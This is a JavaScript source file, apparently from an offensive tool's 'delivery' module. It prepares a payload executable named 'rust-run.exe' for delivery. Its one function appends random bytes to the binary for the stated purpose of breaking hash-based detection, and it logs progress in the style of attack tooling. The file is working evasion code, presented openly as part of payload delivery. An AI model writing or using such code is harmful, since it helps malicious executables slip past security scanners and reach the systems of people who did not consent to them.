/// File: tex1step/src/delivery/custom_payload.js
'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

/**
 * Prepares the Rust-Run payload for delivery
 * Takes the compiled Rust-Run executable and adds randomization
 * to break hash-based detection mechanisms.
 */
function prepareRustRunPayload(options) {
  const {
    sourcePath = path.join(__dirname, '../../payloads/rust-run.exe'),
    outputPath,
    addRandomization = true,
    randomDataSize = 256
  } = options;
  
  console.log(`[+] Preparing Rust-Run payload...`);
  console.log(`[+] Source: ${sourcePath}`);
  console.log(`[+] Destination: ${outputPath}`);
  
  try {
    // Read the source executable
    const exeData = fs.readFileSync(sourcePath);
    
    if (addRandomization) {
      // Add randomization to avoid hash-based detection
      // This appends random data to the end of the file without affecting execution
      const randomBuffer = crypto.randomBytes(randomDataSize);
      const combinedBuffer = Buffer.concat([exeData, randomBuffer]);
      fs.writeFileSync(outputPath, combinedBuffer);
      console.log(`[+] Added ${randomDataSize} bytes of randomization to break hash-based detection`);
    } else {
      // Just copy the file as-is
      fs.copyFileSync(sourcePath, outputPath);
    }
    
    console.log(`[+] Rust-Run payload prepared successfully`);
    return outputPath;
  } catch (err) {
    console.error(`[!] Error preparing Rust-Run payload:`, err);
    throw err;
  }
}

module.exports = {
  prepareRustRunPayload
};
